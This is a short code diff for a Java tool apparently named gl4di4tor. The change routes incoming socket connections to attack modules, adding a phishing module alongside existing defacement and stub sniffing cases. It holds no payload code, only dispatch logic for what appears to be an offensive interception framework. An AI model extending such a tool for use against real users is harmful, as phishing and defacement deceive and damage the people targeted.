@@ -1,9 +1,9 @@
 package gl4di4tor;
 
-import gl4di4tor.assets.AttackMode;
 import gl4di4tor.configuration.Config;
 import gl4di4tor.log.LogService;
 import gl4di4tor.module.deface.DefaceModule;
+import gl4di4tor.module.phishing.PhishingModule;
 
 import java.net.Socket;
 
@@ -23,11 +23,12 @@ public class Router {
     public void route(Socket client) throws Exception {
         LogService.debug("Routing client to " + Config.getInstance().getMode().toUpperCase() + " module");
 
-        switch (AttackMode.valueOf(Config.getInstance().getMode().toUpperCase())) {
+        switch (Config.getInstance().getAttackMode()) {
             case DEFACE:
                 new Thread(new DefaceModule(client)).start();
                 break;
             case PHISHING:
+                new Thread(new PhishingModule(client)).start();
                 break;
             case SNIFF:
                 break;
